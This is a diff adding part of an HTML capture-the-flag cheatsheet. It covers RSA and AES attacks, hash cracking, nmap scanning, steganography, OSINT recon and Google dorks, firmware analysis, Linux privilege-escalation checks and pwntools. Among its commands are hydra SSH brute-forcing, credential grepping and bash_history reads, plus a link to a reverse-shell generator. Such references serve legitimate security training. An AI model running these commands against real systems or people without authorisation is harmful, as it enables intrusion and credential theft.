+<span class="cm"># Let it run in gdb and dump after decode</span>
+<span class="c">dump memory out.bin 0x400000 0x500000</span>
+
+<span class="cm"># VM / packer detection</span>
+<span class="c">detect-it-easy</span> binary   <span class="cm"># DIE tool</span>
+<span class="c">exeinfo</span> binary.exe</code></pre>
+      </div>
+    </div>
+
+    <div class="card re">
+      <div class="card-title">COMMON PATTERNS TO LOOK FOR</div>
+      <div class="card-body">
+        <table>
+          <tr><th>PATTERN</th><th>DESCRIPTION</th></tr>
+          <tr><td>strcmp(input, flag)</td><td>Direct comparison — patch or read flag from memory</td></tr>
+          <tr><td>XOR loop</td><td>XOR each byte — reverse the operation</td></tr>
+          <tr><td>strrev / rot13</td><td>String transformation — reverse it</td></tr>
+          <tr><td>Custom hash check</td><td>Hash of input == expected — may need to brute</td></tr>
+          <tr><td>Math operations</td><td>ax+b=c solve for x per character</td></tr>
+          <tr><td>CRC32 / MD5 check</td><td>Brute force short strings</td></tr>
+        </table>
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Quick XOR reverse in Python</span>
+enc = [0x41, 0x42, 0x43, ...]
+key = 0x37
+flag = <span class="s">""</span>.join(chr(b ^ key) <span class="k">for</span> b <span class="k">in</span> enc)
+print(flag)</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== CRYPTO ===== -->
+<section class="section crypto" id="crypto">
+  <div class="section-header">
+    <div class="section-icon">🔐</div>
+    <div>
+      <div class="section-title">CRYPTOGRAPHY</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">RSA · AES · HASH · CLASSICAL · LFSR · XOR</div>
+    </div>
+    <span class="section-tag">CRYPTO</span>
+  </div>
+
+  <div class="cards">
+    <div class="card crypto">
+      <div class="card-title">RSA ATTACKS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Small e (e=3) + small plaintext → cube root</span>
+<span class="k">from</span> gmpy2 <span class="k">import</span> iroot
+m, exact = iroot(c, e)  <span class="cm"># if exact==True, done!</span>
+
+<span class="cm"># Common modulus attack (same n, e1≠e2)</span>
+<span class="cm"># Extended Euclidean → recover m</span>
+
+<span class="cm"># Wiener attack (small d)</span>
+<span class="cm"># If d &lt; N^0.25 → vulnerable</span>
+<span class="cm"># Use: owiener library</span>
+<span class="k">import</span> owiener
+d = owiener.attack(e, n)
+
+<span class="cm"># Factorize n (if small/known factors)</span>
+<span class="cm"># factordb.com — paste n, check if factored</span>
+<span class="cm"># RsaCtfTool</span>
+python3 RsaCtfTool.py <span class="f">--publickey</span> key.pub <span class="f">--uncipherfile</span> enc
+
+<span class="cm"># Standard decrypt</span>
+<span class="k">from</span> Crypto.Util.number <span class="k">import</span> long_to_bytes
+p, q = ...  <span class="cm"># factored</span>
+phi = (p-1)*(q-1)
+d = pow(e, -1, phi)
+m = pow(c, d, n)
+print(long_to_bytes(m))</code></pre>
+      </div>
+    </div>
+
+    <div class="card crypto">
+      <div class="card-title">XOR / VIGENERE / CLASSICAL</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># XOR — single byte key brute</span>
+ct = bytes.fromhex(<span class="s">"deadbeef..."</span>)
+<span class="k">for</span> k <span class="k">in</span> range(256):
+    out = bytes([b^k <span class="k">for</span> b <span class="k">in</span> ct])
+    <span class="k">if</span> b<span class="s">'CTF{'</span> <span class="k">in</span> out:
+        print(k, out)
+
+<span class="cm"># XOR — find key length (Kasiski / IC)</span>
+<span class="cm"># xortool: xortool -x ciphertext.hex</span>
+<span class="c">xortool</span> <span class="f">-x</span> cipher.hex
+
+<span class="cm"># Vigenere / substitution</span>
+<span class="cm"># quipqiup.com — frequency analysis</span>
+<span class="cm"># dcode.fr — identify + solve classical ciphers</span>
+
+<span class="cm"># Caesar brute</span>
+ct = <span class="s">"KHOOR ZRUOG"</span>
+<span class="k">for</span> s <span class="k">in</span> range(26):
+    print(s, <span class="s">""</span>.join(chr((ord(c)-65-s)%26+65) <span class="k">if</span> c.isalpha() <span class="k">else</span> c <span class="k">for</span> c <span class="k">in</span> ct))</code></pre>
+      </div>
+    </div>
+
+    <div class="card crypto">
+      <div class="card-title">AES MODES & ATTACKS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># AES-ECB — same plaintext = same ciphertext</span>
+<span class="cm"># Detect: block repetition in ciphertext</span>
+<span class="cm"># Attack: ECB byte-at-a-time oracle</span>
+<span class="cm"># Craft: AAAA...A + 1 unknown byte</span>
+
+<span class="cm"># AES-CBC bit flipping</span>
+<span class="cm"># C[i] XOR delta → P[i+1] XOR delta</span>
+<span class="cm"># Flip bits in C[i] to control P[i+1]</span>
+
+<span class="cm"># Padding oracle (CBC)</span>
+<span class="k">from</span> mitmproxy.crypto <span class="k">import</span> ...
+<span class="cm"># Tool: padbuster, python-paddingoracle</span>
+<span class="c">padbuster</span> http://target/decrypt BLOCK 16
+
+<span class="cm"># AES-CTR nonce reuse</span>
+<span class="cm"># If two ciphertexts share nonce:</span>
+<span class="cm"># C1 XOR C2 = P1 XOR P2 → crib drag</span>
+
+<span class="cm"># Decrypt with known key</span>
+<span class="k">from</span> Crypto.Cipher <span class="k">import</span> AES
+cipher = AES.new(key, AES.MODE_CBC, iv)
+pt = cipher.decrypt(ct)</code></pre>
+      </div>
+    </div>
+
+    <div class="card crypto">
+      <div class="card-title">HASH CRACKING</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Identify hash</span>
+<span class="c">hash-identifier</span> &lt;hash&gt;
+<span class="c">hashid</span> &lt;hash&gt;
+
+<span class="cm"># hashcat</span>
+<span class="c">hashcat</span> <span class="f">-m 0</span>    hash.txt rockyou.txt  <span class="cm"># MD5</span>
+<span class="c">hashcat</span> <span class="f">-m 100</span>  hash.txt rockyou.txt  <span class="cm"># SHA1</span>
+<span class="c">hashcat</span> <span class="f">-m 1400</span> hash.txt rockyou.txt  <span class="cm"># SHA256</span>
+<span class="c">hashcat</span> <span class="f">-m 3200</span> hash.txt rockyou.txt  <span class="cm"># bcrypt</span>
+<span class="c">hashcat</span> <span class="f">-m 0 -a 3</span> hash.txt <span class="s">'?a?a?a?a?a?a'</span>  <span class="cm"># brute 6 chars</span>
+
+<span class="cm"># john</span>
+<span class="c">john</span> <span class="f">--wordlist=</span>rockyou.txt hash.txt
+<span class="c">john</span> <span class="f">--show</span> hash.txt
+
+<span class="cm"># Online</span>
+<span class="cm"># crackstation.net — huge precomputed table</span>
+<span class="cm"># hashes.com</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card crypto">
+      <div class="card-title">ENCODING / DECODING</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Base64</span>
+<span class="c">echo</span> <span class="s">"dGVzdA=="</span> | base64 <span class="f">-d</span>
+python3 <span class="f">-c</span> <span class="s">"import base64;print(base64.b64decode('dGVzdA=='))"</span>
+
+<span class="cm"># Hex</span>
+<span class="c">echo</span> <span class="s">"68656c6c6f"</span> | xxd <span class="f">-r -p</span>
+python3 <span class="f">-c</span> <span class="s">"print(bytes.fromhex('68656c6c6f'))"</span>
+
+<span class="cm"># CyberChef — the magic tool</span>
+<span class="cm"># gchq.github.io/CyberChef</span>
+<span class="cm"># Use "Magic" recipe — auto-detects encoding</span>
+
+<span class="cm"># Common encodings checklist:</span>
+<span class="cm"># Base64, Base32, Base58, Hex, URL, HTML</span>
+<span class="cm"># ROT13, ROT47, Binary, Octal, Morse</span>
+<span class="cm"># Brainfuck, JSFuck, Malboge, Whitespace</span></code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== NETWORK ===== -->
+<section class="section network" id="network">
+  <div class="section-header">
+    <div class="section-icon">📡</div>
+    <div>
+      <div class="section-title">NETWORK / TRAFFIC ANALYSIS</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">PCAP · NMAP · DNS · PROTOCOLS · PIVOTING</div>
+    </div>
+    <span class="section-tag">NETWORK</span>
+  </div>
+
+  <div class="cards">
+    <div class="card network">
+      <div class="card-title">NMAP SCANNING</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Host discovery</span>
+<span class="c">nmap</span> <span class="f">-sn</span> 192.168.1.0/24
+
+<span class="cm"># Port scan</span>
+<span class="c">nmap</span> <span class="f">-sV -sC</span> 10.10.10.1
+<span class="c">nmap</span> <span class="f">-p-</span> 10.10.10.1             <span class="cm"># all ports</span>
+<span class="c">nmap</span> <span class="f">-p- -T4</span> 10.10.10.1        <span class="cm"># fast</span>
+<span class="c">nmap</span> <span class="f">-sU</span> 10.10.10.1            <span class="cm"># UDP</span>
+
+<span class="cm"># Scripts</span>
+<span class="c">nmap</span> <span class="f">--script</span> vuln 10.10.10.1
+<span class="c">nmap</span> <span class="f">--script</span> http-enum 10.10.10.1
+<span class="c">nmap</span> <span class="f">--script</span> smb-vuln* 10.10.10.1
+<span class="c">nmap</span> <span class="f">--script</span> ftp-anon 10.10.10.21
+
+<span class="cm"># Output</span>
+<span class="c">nmap</span> <span class="f">-oA</span> scan_results 10.10.10.1  <span class="cm"># all formats</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card network">
+      <div class="card-title">PROTOCOL ANALYSIS</div>
+      <div class="card-body">
+        <table>
+          <tr><th>PROTOCOL</th><th>TOOLS / NOTES</th></tr>
+          <tr><td>HTTP/S</td><td>Burp, curl, httpie, Wireshark filter: http</td></tr>
+          <tr><td>FTP</td><td>Anon login: ftp -A; filter: ftp-data</td></tr>
+          <tr><td>SSH</td><td>ssh-audit, brute: hydra -l user -P pass.txt ssh://host</td></tr>
+          <tr><td>SMB</td><td>smbclient, enum4linux, nmap smb-*</td></tr>
+          <tr><td>DNS</td><td>dig, nslookup, dnsx; zone transfer: dig axfr</td></tr>
+          <tr><td>SMTP</td><td>Filter smtp; look for creds in cleartext</td></tr>
+          <tr><td>Telnet</td><td>Cleartext — filter in Wireshark → Follow TCP</td></tr>
+        </table>
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># DNS zone transfer</span>
+<span class="c">dig</span> axfr @ns1.domain.com domain.com
+<span class="c">fierce</span> <span class="f">--domain</span> example.com</code></pre>
+      </div>
+    </div>
+
+    <div class="card network">
+      <div class="card-title">PACKET ANALYSIS WORKFLOW</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Step 1: overview</span>
+<span class="c">capinfos</span> capture.pcap
+<span class="c">tshark</span> <span class="f">-r</span> cap.pcap <span class="f">-q -z</span> io,phs  <span class="cm"># protocol hierarchy</span>
+<span class="c">tshark</span> <span class="f">-r</span> cap.pcap <span class="f">-q -z</span> conv,tcp  <span class="cm"># conversations</span>
+
+<span class="cm"># Step 2: filter interesting</span>
+<span class="c">tshark</span> <span class="f">-r</span> cap.pcap <span class="f">-Y</span> <span class="s">"http.request or ftp-data"</span>
+
+<span class="cm"># Step 3: extract files</span>
+<span class="c">tshark</span> <span class="f">-r</span> cap.pcap <span class="f">--export-objects</span> http,./http_files/
+<span class="c">tshark</span> <span class="f">-r</span> cap.pcap <span class="f">--export-objects</span> smb,./smb_files/
+<span class="c">tshark</span> <span class="f">-r</span> cap.pcap <span class="f">--export-objects</span> ftp-data,./ftp_files/
+
+<span class="cm"># Step 4: strings + grep</span>
+<span class="c">strings</span> cap.pcap | grep <span class="f">-iE</span> <span class="s">"(flag|ctf|pico)\{.+\}"</span></code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== STEGO ===== -->
+<section class="section stego" id="stego">
+  <div class="section-header">
+    <div class="section-icon">🎨</div>
+    <div>
+      <div class="section-title">STEGANOGRAPHY</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">IMAGE · AUDIO · LSB · DCT · METADATA · WHITESPACE</div>
+    </div>
+    <span class="section-tag">STEGO</span>
+  </div>
+
+  <div class="cards">
+    <div class="card stego">
+      <div class="card-title">IMAGE STEGANOGRAPHY</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Metadata</span>
+<span class="c">exiftool</span> image.jpg
+<span class="c">exiftool</span> <span class="f">-b -ThumbnailImage</span> image.jpg &gt; thumb.jpg
+
+<span class="cm"># Binwalk (embedded files)</span>
+<span class="c">binwalk</span> <span class="f">-e</span> image.jpg
+
+<span class="cm"># steghide (JPEG/BMP)</span>
+<span class="c">steghide</span> info image.jpg
+<span class="c">steghide</span> extract <span class="f">-sf</span> image.jpg          <span class="cm"># no password</span>
+<span class="c">steghide</span> extract <span class="f">-sf</span> image.jpg <span class="f">-p</span> pass
+
+<span class="cm"># zsteg (PNG)</span>
+<span class="c">zsteg</span> image.png                         <span class="cm"># auto scan</span>
+<span class="c">zsteg</span> <span class="f">-a</span> image.png                      <span class="cm"># all methods</span>
+
+<span class="cm"># stegsolve (Java GUI)</span>
+<span class="cm"># View different bit planes, color channels</span>
+
+<span class="cm"># LSB extraction (Python)</span>
+<span class="k">from</span> PIL <span class="k">import</span> Image
+img = Image.open(<span class="s">'img.png'</span>)
+bits = [pixel[0]&amp;1 <span class="k">for</span> pixel <span class="k">in</span> img.getdata()]</code></pre>
+      </div>
+    </div>
+
+    <div class="card stego">
+      <div class="card-title">AUDIO STEGANOGRAPHY</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Visual inspection</span>
+<span class="cm"># Open in Audacity → Spectrogram view</span>
+<span class="cm"># Flags often hidden in spectogram as text/image</span>
+
+<span class="cm"># Metadata</span>
+<span class="c">exiftool</span> audio.wav
+
+<span class="cm"># MP3 hidden data</span>
+<span class="c">mp3stego-decode</span> <span class="f">-P</span> password audio.mp3 output.txt
+
+<span class="cm"># Strings in audio</span>
+<span class="c">strings</span> audio.wav | grep <span class="f">-i</span> flag
+
+<span class="cm"># DTMF tones (phone keypad)</span>
+<span class="c">multimon-ng</span> <span class="f">-t wav -a DTMF</span> audio.wav
+<span class="c">sox</span> audio.wav <span class="f">-n</span> spectrogram   <span class="cm"># spectrogram</span>
+
+<span class="cm"># Morse / CW</span>
+<span class="cm"># Listen or view waveform, decode manually</span>
+<span class="cm"># morse-it.com / morse decoder tools</span>
+
+<span class="cm"># LSB in WAV samples</span>
+<span class="c">python3</span> <span class="f">-c</span> <span class="s">"
+import wave, struct
+with wave.open('a.wav') as w:
+    frames = w.readframes(w.getnframes())
+    samples = struct.unpack(f'{len(frames)//2}h', frames)
+    bits = [s&amp;1 for s in samples]
+    flag = ''.join(chr(int(''.join(map(str,bits[i:i+8])),2)) for i in range(0,200,8))
+    print(flag)
+"</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card stego">
+      <div class="card-title">TEXT / WHITESPACE STEGO</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Whitespace language (tabs/spaces)</span>
+<span class="c">cat</span> <span class="f">-A</span> file.txt            <span class="cm"># show tabs (^I) and spaces</span>
+<span class="cm"># Run at: vii.one/whitespace</span>
+
+<span class="cm"># Zero-width characters</span>
+<span class="c">cat</span> file.txt | xxd | grep <span class="s">"e2 80"</span>  <span class="cm"># unicode ZWJ etc.</span>
+
+<span class="cm"># Snow (whitespace steganography)</span>
+<span class="c">stegsnow</span> <span class="f">-C</span> file.txt
+
+<span class="cm"># Binary in first letters</span>
+<span class="cm"># Read first letter/word of each line</span>
+<span class="c">awk</span> <span class="s">'{print substr($0,1,1)}'</span> poem.txt
+
+<span class="cm"># Baconian cipher (A/B sequences)</span>
+<span class="cm"># dcode.fr/bacon-cipher</span>
+
+<span class="cm"># Check if text has hidden URL</span>
+<span class="c">grep</span> <span class="f">-oP</span> <span class="s">'https?://[^\s"]+'</span> file.txt</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== OSINT ===== -->
+<section class="section osint" id="osint">
+  <div class="section-header">
+    <div class="section-icon">🔭</div>
+    <div>
+      <div class="section-title">OSINT</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">SOCIAL MEDIA · GEOLOCATION · METADATA · RECON</div>
+    </div>
+    <span class="section-tag">OSINT</span>
+  </div>
+
+  <div class="cards">
+    <div class="card osint">
+      <div class="card-title">IMAGE GEOLOCATION</div>
+      <div class="card-body">
+        <div class="alert alert-tip">💡 Check EXIF GPS data first — often the flag is just coordinates in metadata</div>
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="c">exiftool</span> image.jpg | grep <span class="f">-i</span> <span class="s">"gps\|lat\|lon\|location"</span></code></pre>
+        <table>
+          <tr><th>TOOL</th><th>USE</th></tr>
+          <tr><td>Google Maps</td><td>Reverse image location search</td></tr>
+          <tr><td>Google Lens</td><td>Identify landmarks / objects</td></tr>
+          <tr><td>GeoGuessr</td><td>Train geolocation skills</td></tr>
+          <tr><td>Yandex Images</td><td>Often better than Google for geo</td></tr>
+          <tr><td>Bing Maps Bird's Eye</td><td>Aerial imagery different angles</td></tr>
+          <tr><td>what3words</td><td>3-word location encoding</td></tr>
+          <tr><td>SunCalc</td><td>Shadow/sun angle → time + location</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="card osint">
+      <div class="card-title">SOCIAL MEDIA / USERNAME RECON</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Username search across platforms</span>
+<span class="c">sherlock</span> username
+<span class="c">whatsmyname</span> -u username
+<span class="c">maigret</span> username
+
+<span class="cm"># Email OSINT</span>
+<span class="c">holehe</span> user@example.com  <span class="cm"># account existence</span>
+<span class="c">h8mail</span> <span class="f">-t</span> user@example.com  <span class="cm"># breach check</span>
+
+<span class="cm"># Domain / IP recon</span>
+<span class="c">whois</span> domain.com
+<span class="c">theHarvester</span> <span class="f">-d</span> domain.com <span class="f">-b</span> all
+<span class="c">amass enum</span> <span class="f">-d</span> domain.com
+<span class="c">subfinder</span> <span class="f">-d</span> domain.com
+
+<span class="cm"># Online resources</span>
+<span class="cm"># Wayback Machine: web.archive.org</span>
+<span class="cm"># Shodan: shodan.io</span>
+<span class="cm"># Censys: search.censys.io</span>
+<span class="cm"># Maltego: visual link analysis</span>
+<span class="cm"># OSINT Framework: osintframework.com</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card osint">
+      <div class="card-title">GOOGLE DORKS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code>site:example.com filetype:pdf
+site:github.com "password" "example.com"
+inurl:admin site:example.com
+intitle:"index of" "backup"
+"@example.com" filetype:xls
+site:pastebin.com "example.com" "password"
+site:linkedin.com "company name" employees
+cache:example.com
+related:example.com</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== HARDWARE ===== -->
+<section class="section hardware" id="hardware">
+  <div class="section-header">
+    <div class="section-icon">🔧</div>
+    <div>
+      <div class="section-title">HARDWARE / ICS / EMBEDDED</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">UART · SPI · I2C · JTAG · FIRMWARE · SIDE CHANNEL</div>
+    </div>
+    <span class="section-tag">HARDWARE</span>
+  </div>
+
+  <div class="cards">
+    <div class="card hardware">
+      <div class="card-title">FIRMWARE ANALYSIS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Extract and identify</span>
+<span class="c">file</span> firmware.bin
+<span class="c">binwalk</span> firmware.bin
+<span class="c">binwalk</span> <span class="f">-e</span> firmware.bin      <span class="cm"># extract</span>
+<span class="c">binwalk</span> <span class="f">-M -e</span> firmware.bin   <span class="cm"># recursive extract</span>
+
+<span class="cm"># Check entropy (high = encrypted/compressed)</span>
+<span class="c">binwalk</span> <span class="f">-E</span> firmware.bin
+
+<span class="cm"># Emulate with QEMU</span>
+<span class="c">qemu-mips-static</span> <span class="f">-L</span> squashfs-root/ ./binary
+
+<span class="cm"># Find credentials / keys</span>
+<span class="c">grep</span> <span class="f">-r</span> <span class="s">"password\|passwd\|secret\|key"</span> squashfs-root/
+<span class="c">grep</span> <span class="f">-r</span> <span class="s">"admin\|root"</span> squashfs-root/etc/
+
+<span class="cm"># JFFS2 / SquashFS</span>
+<span class="c">jefferson</span> firmware.jffs2 <span class="f">-d</span> out/    <span class="cm"># JFFS2</span>
+<span class="c">unsquashfs</span> filesystem.squashfs</code></pre>
+      </div>
+    </div>
+
+    <div class="card hardware">
+      <div class="card-title">SERIAL / DEBUG INTERFACES</div>
+      <div class="card-body">
+        <table>
+          <tr><th>INTERFACE</th><th>PINS / NOTES</th></tr>
+          <tr><td>UART</td><td>TX, RX, GND — common: 115200 8N1</td></tr>
+          <tr><td>JTAG</td><td>TDI, TDO, TCK, TMS — debug/flash access</td></tr>
+          <tr><td>SPI</td><td>MOSI, MISO, CLK, CS — flash chips</td></tr>
+          <tr><td>I2C</td><td>SDA, SCL — sensors, EEPROMs</td></tr>
+          <tr><td>SWD</td><td>SWDIO, SWCLK — ARM debug</td></tr>
+        </table>
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># UART connection</span>
+<span class="c">screen</span> /dev/ttyUSB0 115200
+<span class="c">minicom</span> <span class="f">-D</span> /dev/ttyUSB0 <span class="f">-b</span> 115200
+<span class="c">picocom</span> /dev/ttyUSB0 <span class="f">-b</span> 115200
+
+<span class="cm"># Logic analyzer — Saleae / Sigrok</span>
+<span class="c">sigrok-cli</span> <span class="f">-d</span> fx2lafw <span class="f">--protocol-decoders</span> uart
+
+<span class="cm"># Identify baud rate</span>
+<span class="cm"># Measure shortest pulse width in logic analyzer</span>
+<span class="cm"># baud = 1 / pulse_width</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card hardware">
+      <div class="card-title">SIDE CHANNEL / SIGNAL ANALYSIS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Power analysis (timing/power traces)</span>
+<span class="cm"># Simple Power Analysis (SPA) — visual inspection</span>
+<span class="cm"># Differential Power Analysis (DPA) — statistical</span>
+<span class="cm"># Tool: ChipWhisperer</span>
+
+<span class="cm"># SDR (Software Defined Radio)</span>
+<span class="c">gqrx</span>              <span class="cm"># receive / spectrum view</span>
+<span class="c">gnuradio</span>          <span class="cm"># signal processing</span>
+<span class="c">rtl_433</span>           <span class="cm"># decode 433MHz sensors</span>
+<span class="c">inspectrum</span> sig.iq  <span class="cm"># visualize IQ capture</span>
+
+<span class="cm"># Decode common protocols</span>
+<span class="c">multimon-ng</span> <span class="f">-t raw</span> signal.raw
+<span class="c">gr-gsm</span>            <span class="cm"># GSM capture/decode</span></code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== MISC ===== -->
+<section class="section misc" id="misc">
+  <div class="section-header">
+    <div class="section-icon">⚡</div>
+    <div>
+      <div class="section-title">MISC / ALWAYS USEFUL</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">LINUX · PYTHON · PWNTOOLS · ONE-LINERS · WORDLISTS</div>
+    </div>
+    <span class="section-tag">MISC</span>
+  </div>
+
+  <div class="cards">
+    <div class="card misc">
+      <div class="card-title">LINUX QUICK COMMANDS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Find files</span>
+<span class="c">find</span> / <span class="f">-name</span> <span class="s">"flag*"</span> 2>/dev/null
+<span class="c">find</span> / <span class="f">-perm -4000</span> 2>/dev/null   <span class="cm"># SUID</span>
+<span class="c">find</span> / <span class="f">-writable -type f</span> 2>/dev/null
+
+<span class="cm"># Useful one-liners</span>
+<span class="c">cat</span> /etc/passwd | <span class="c">grep</span> <span class="f">-v</span> nologin
+<span class="c">sudo</span> <span class="f">-l</span>                     <span class="cm"># what can I sudo?</span>
+<span class="c">crontab</span> <span class="f">-l</span>                  <span class="cm"># cron jobs</span>
+<span class="c">env</span>                          <span class="cm"># environment vars (may contain flags!)</span>
+<span class="c">history</span>                      <span class="cm"># command history</span>
+<span class="c">cat</span> ~/.bash_history
+<span class="c">ss</span> <span class="f">-tlnp</span>                    <span class="cm"># listening ports</span>
+<span class="c">ps aux</span>                       <span class="cm"># running processes</span>
+
+<span class="cm"># Privilege escalation checks</span>
+<span class="c">linpeas.sh</span>                  <span class="cm"># automated priv-esc</span>
+<span class="c">lse.sh</span>                      <span class="cm"># linux smart enum</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card misc">
+      <div class="card-title">PYTHON CTF SNIPPETS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># XOR bruteforce</span>
+ct = bytes.fromhex(<span class="s">"deadbeef"</span>)
+<span class="k">for</span> k <span class="k">in</span> range(256):
+    out = bytes([b^k <span class="k">for</span> b <span class="k">in</span> ct])
+    <span class="k">if</span> b<span class="s">"CTF"</span> <span class="k">in</span> out: print(k, out)
+
+<span class="cm"># Frequency analysis</span>
+<span class="k">from</span> collections <span class="k">import</span> Counter
+ct = <span class="s">"XUBJXUBJ..."</span>
+Counter(ct).most_common(5)  <span class="cm"># 'E' = most common</span>
+
+<span class="cm"># Integer factorization</span>
+<span class="k">from</span> sympy <span class="k">import</span> factorint
+print(factorint(n))
+
+<span class="cm"># Number conversions</span>
+int(<span class="s">"ff"</span>, 16)     <span class="cm"># hex → int</span>
+hex(255)          <span class="cm"># int → hex</span>
+bin(255)          <span class="cm"># int → binary</span>
+chr(65)           <span class="cm"># int → char</span>
+ord(<span class="s">'A'</span>)          <span class="cm"># char → int</span>
+bytes.fromhex(<span class="s">"48656c6c6f"</span>).decode()
+
+<span class="cm"># CyberChef in Python: magic</span>
+<span class="k">import</span> base64, binascii
+base64.b64decode(<span class="s">"dGVzdA=="</span>)
+binascii.unhexlify(<span class="s">"deadbeef"</span>)</code></pre>
+      </div>
+    </div>
+
+    <div class="card misc">
+      <div class="card-title">PWNTOOLS CHEATSHEET</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="k">from</span> pwn <span class="k">import</span> *
+
+<span class="cm"># Context</span>
+context.arch = <span class="s">'amd64'</span>    <span class="cm"># i386 / arm / mips</span>
+context.os = <span class="s">'linux'</span>
+context.log_level = <span class="s">'debug'</span>
+
+<span class="cm"># Connections</span>
+p = process(<span class="s">'./binary'</span>)
+p = remote(<span class="s">'host'</span>, 1337)
+p = gdb.debug(<span class="s">'./binary'</span>)
+
+<span class="cm"># IO</span>
+p.recv(1024)
+p.recvline()
+p.recvuntil(b<span class="s">'> '</span>)
+p.sendline(b<span class="s">'input'</span>)
+p.send(payload)
+p.interactive()
+
+<span class="cm"># Utils</span>
+p64(0xdeadbeef)   p32(0x41414141)
+flat([0x41]*40 + [win_addr])
+cyclic(200);  cyclic_find(0x61616174)
+asm(<span class="s">"nop; nop"</span>)
+disasm(b<span class="s">"\x90\x90"</span>)
+
+<span class="cm"># ELF</span>
+elf = ELF(<span class="s">'./binary'</span>)
+elf.symbols[<span class="s">'win'</span>]   elf.got[<span class="s">'puts'</span>]
+elf.plt[<span class="s">'system'</span>]    elf.address</code></pre>
+      </div>
+    </div>
+
+    <div class="card misc">
+      <div class="card-title">WORDLISTS & RESOURCES</div>
+      <div class="card-body">
+        <table>
+          <tr><th>RESOURCE</th><th>DESCRIPTION</th></tr>
+          <tr><td>/usr/share/wordlists/rockyou.txt</td><td>Password cracking (14M passwords)</td></tr>
+          <tr><td>/usr/share/wordlists/dirb/</td><td>Web directory bruteforce</td></tr>
+          <tr><td>SecLists (GitHub)</td><td>Massive collection of wordlists</td></tr>
+          <tr><td>gchq.github.io/CyberChef</td><td>Encoding/decoding/crypto swiss army knife</td></tr>
+          <tr><td>dcode.fr</td><td>Identify + solve any classical cipher</td></tr>
+          <tr><td>crackstation.net</td><td>Online hash lookup</td></tr>
+          <tr><td>factordb.com</td><td>RSA factor database</td></tr>
+          <tr><td>gtfobins.github.io</td><td>Unix binary priv-esc / escape</td></tr>
+          <tr><td>lolbas-project.github.io</td><td>Windows binary living-off-the-land</td></tr>
+          <tr><td>revshells.com</td><td>Reverse shell generator</td></tr>
+          <tr><td>HackTricks</td><td>book.hacktricks.xyz — pentest bible</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+</section>
+
+</div><!-- end content -->
+</main>
+
+<footer>
+  0xHACK CTF CHEATSHEET // FOR EDUCATIONAL PURPOSES ONLY // HAPPY HACKING
+</footer>
+
+<!-- Back to Top Button -->
+<button class="back-to-top" id="backToTop" title="Back to top">↑</button>
+
+<script src="script.js"></script>
+</body>
+</html>
